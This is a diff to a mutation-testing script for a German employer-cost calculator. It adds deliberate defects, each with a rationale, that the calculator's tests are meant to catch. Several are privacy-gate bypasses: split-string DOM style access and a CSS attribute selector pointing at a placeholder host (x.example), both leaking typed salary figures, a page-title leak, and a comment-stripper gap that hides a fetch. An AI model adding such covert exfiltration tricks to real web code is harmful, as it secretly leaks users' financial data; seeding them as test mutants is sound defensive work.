@@ -37,11 +37,19 @@ const VALIDATION = 'lib/calculators/de-employer-cost/validation.ts'
 const COMPONENT = 'components/DeEmployerCostCalculator.tsx'
 const BOUNDARY = 'components/DeEmployerCostCalculatorBoundary.tsx'
 const UNSUPPORTED = 'lib/calculators/de-employer-cost/unsupported.ts'
+const FORMATTING = 'lib/calculators/de-employer-cost/formatting.ts'
+const PRIVACY = 'lib/calculators/de-employer-cost/privacy.test.ts'
+const STYLES = 'styles.css'
+const COPY = 'lib/calculators/de-employer-cost/copy.ts'
+const CS_PAGE = 'lib/content/pages/germany-employer-cost-calculator.ts'
 
 /** The anchor the two pixel mutations attach to. */
 const LEDGER = '                <p className="ecc__exactness">{tr(RESULT.ledgerNote)}</p>'
 
-const TOUCHED = [PAP, BRANCHES, BVV, SCOPE, ENGINE, CHURCH, RULES, VALIDATION, COMPONENT, BOUNDARY, UNSUPPORTED]
+const TOUCHED = [
+  PAP, BRANCHES, BVV, SCOPE, ENGINE, CHURCH, RULES, VALIDATION, COMPONENT, BOUNDARY, UNSUPPORTED,
+  FORMATTING, PRIVACY, STYLES, COPY, CS_PAGE,
+]
 const ORIGINAL = new Map(TOUCHED.map((f) => [f, read(f)]))
 
 /**
@@ -92,8 +100,8 @@ const MUTATIONS = [
       'The classic error in this jurisdiction. 69 750 is the contribution ceiling and 77 400 is the threshold above ' +
       'which an employee may leave the statutory scheme; both are "the health insurance limit" in ordinary speech.',
     file: RULES,
-    from: "    monthlyCeilingCent: {\n      value: eur(5_812, 50),\n      sourceId: S.svRechgr,\n      legalBasis: '§ 2 Absatz 2 SVRechGrV 2026; § 55 Absatz 2 SGB XI',",
-    to: "    monthlyCeilingCent: {\n      value: eur(6_450),\n      sourceId: S.svRechgr,\n      legalBasis: '§ 2 Absatz 2 SVRechGrV 2026; § 55 Absatz 2 SGB XI',",
+    from: "    monthlyCeilingCent: {\n      value: eur(5_812, 50),\n      sourceId: S.svRechgr,\n      // § 55 Absatz 2 SGB XI appears on the HEALTH ceiling",
+    to: "    monthlyCeilingCent: {\n      value: eur(6_450),\n      sourceId: S.svRechgr,\n      // § 55 Absatz 2 SGB XI appears on the HEALTH ceiling",
   },
   {
     name: '6. contributions computed whole and halved, instead of halved and doubled',
@@ -271,6 +279,7 @@ const MUTATIONS = [
     from: "§ 7 Absatz 1 Satz 1 Nummer 1 SGB V und die entsprechenden Vorschriften der übrigen Zweige",
     to: "§ 8 Absatz 3 Satz 1 SGB IV",
   },
+
   // ── Privacy. Each of these three was written during review as an ATTEMPT to
   // defeat the gate, and the first two succeeded before it was strengthened.
   {
@@ -327,6 +336,111 @@ const MUTATIONS = [
     file: BOUNDARY,
     from: "const Calculator = dynamic(() => import('./DeEmployerCostCalculator'), {",
     to: "const Calculator = dynamic(() => import(`./${'DeEmployerCostCalculator'}`), {",
+  },
+  // ── Round five. Six independent bypasses of the privacy gate, a thousandfold
+  // money misread, and four sentences that were false in one language only.
+  {
+    name: '30. the comment stripper that swallowed a live fetch',
+    why:
+      'A regex character class containing a slash and a star opened a block comment as far as the hand-written ' +
+      'walker was concerned, and it blanked everything to the next terminator. A reviewer put an unobfuscated ' +
+      'fetch in the gap and all 729 assertions passed, because none of them saw the line.',
+    file: PRIVACY,
+    from: '    const kids = n.getChildren(sf);',
+    to: '    if (src.indexOf("/*") !== -1) { blank(src.indexOf("/*"), src.indexOf("*/", src.indexOf("/*") + 2) + 2) }\n    const kids = n.getChildren(sf);',
+  },
+  {
+    name: '31. the same DOM leak with the node held in a local and the keys bracketed',
+    why:
+      'The answer to mutation 27 was a list of property names, which is textual: n[\'sty\' + \'le\'] walks past it. ' +
+      'The structural gate is what has to catch this — style and setProperty are properties the closure never ' +
+      'declares, and the bracket access is a computed site that is not pinned.',
+    file: COMPONENT,
+    from: "onChange={(e) => set('gross')(e.target.value)}",
+    to:
+      "onChange={(e) => { const n = e.target; n['sty' + 'le']['setPro' + 'perty']('back' + 'ground-' + 'image', " +
+      "'ur' + 'l(' + '/' + 'r/' + n.value + ')'); set('gross')(n.value) }}",
+  },
+  {
+    name: '32. ambient state through ownerDocument, which issues no request at all',
+    why:
+      'e.target.ownerDocument.title defeats every browser-global rule — ownerDocument contains no lowercase ' +
+      '"document", defaultView names no window — and the runtime wire watcher cannot see it, because writing a ' +
+      'title makes no request. The site chrome then sends the title with the next page_view.',
+    file: COMPONENT,
+    from: "onChange={(e) => set('gross')(e.target.value)}",
+    to:
+      "onChange={(e) => { e.target.ownerDocument.title = e.target.value + ':' + steuerklasse; " +
+      "set('gross')(e.target.value) }}",
+  },
+  {
+    name: '33. the stylesheet half of the CSS conspiracy, on a class the gate used to skip',
+    why:
+      'The stylesheet was filtered to chunks containing ".ecc"; the calculator\'s form is .pcalc__grid, so 88 rules ' +
+      'that style it were never inspected. An attribute selector paired with a background-image exfiltrates a ' +
+      'figure digit by digit, and neither file looks wrong on its own.',
+    file: STYLES,
+    from: '.ecc--de .ecc__table-wrap { overflow-x: auto; max-width: 100%; }',
+    to:
+      '.ecc--de .ecc__table-wrap { overflow-x: auto; max-width: 100%; }\n' +
+      '.pcalc__grid [data-net^="1"] { background-image: url(https://x.example/1); }',
+  },
+  {
+    name: '34. the parser reading a three-decimal amount as thousands again',
+    why:
+      'On the German page "12,500" meant twelve euro fifty with a stray zero and was read as twelve thousand five ' +
+      'hundred. Typed into the accident-insurance field on a 3 000 EUR gross it moved employer cost from 3 651,50 ' +
+      'to 16 139,00 with no error, no warning and no refusal.',
+    file: FORMATTING,
+    from: '      if (isDecimalSeparatorHere) return null;',
+    to: '      if (false) return null;',
+  },
+  {
+    name: '35. engine-validation issues rendered without naming their field',
+    why:
+      'The parse half of this list names its field and the engine half did not, so "Please enter a monthly amount ' +
+      'below 100 million euro." appeared alone with four monthly amounts on screen — one branch away from the ' +
+      'defect the parse-side fix was written to answer.',
+    file: COMPONENT,
+    from: "                    <strong>{tr(ISSUE_FIELD[i.field] ?? FIELD.gross)}:</strong>{' '}\n",
+    to: '',
+  },
+  {
+    name: '36. the Kurzarbeit refusal telling a Czech reader the labour agency pays part',
+    why:
+      'Under § 249 Absatz 2 SGB V the employer bears the contribution on the fictitious pay ALONE. The German and ' +
+      'English texts of the same case name no bearer, so only the Czech reader was told this — on a calculator ' +
+      'whose whole subject is who bears which cost.',
+    file: UNSUPPORTED,
+    from: "'Kurzarbeitergeld a rozdělení odvodů během výpadku práce se řídí vlastními pravidly. Běžný výpočet zde neplatí.'",
+    to: "'Při kurzarbeitu se odvody počítají z fiktivního vyměřovacího základu a část hradí Spolková agentura práce. Běžný výpočet zde neplatí.'",
+  },
+  {
+    name: '37. the Minijob refusal describing a boundary it does not fire at',
+    why:
+      'The refusal is inclusive at 603,00 EUR, and § 8 Absatz 1 Nummer 1 SGB IV covers pay that does not EXCEED ' +
+      'the limit. "Unterhalb" contradicted both the code and the ceilings list on the same screen.',
+    file: UNSUPPORTED,
+    from: "'Bis einschließlich zur Geringfügigkeitsgrenze gelten pauschale",
+    to: "'Unterhalb der Geringfügigkeitsgrenze gelten pauschale",
+  },
+  {
+    name: '38. the U2 warning claiming the levy binds every employer without exception',
+    why:
+      '§ 11 AAG disapplies § 1 entirely to farming family members and NATO-stationed forces. The distinguishing ' +
+      'fact about U2 is that it does not stop at 30 employees the way U1 does, which is a different claim.',
+    file: COPY,
+    from: 'Die Umlage U2 gilt nach § 1 Absatz 2 AAG unabhängig von der Beschäftigtenzahl — anders als U1 — vorbehaltlich der Ausnahmen des § 11 AAG;',
+    to: 'Die Umlage U2 ist nach § 1 Absatz 2 AAG für jeden Arbeitgeber verpflichtend;',
+  },
+  {
+    name: '39. a declared refusal dropped from the page that lists the refusals',
+    why:
+      'The methodology enumerated ten cases while the registry declared fifteen. A reader consulting it to learn ' +
+      'whether an apprentice can be calculated was told, by omission, that one can.',
+    file: CS_PAGE,
+    from: 'krátkodobé zaměstnání, učně, dobrovolnickou službu, ',
+    to: '',
   },
 ]
 
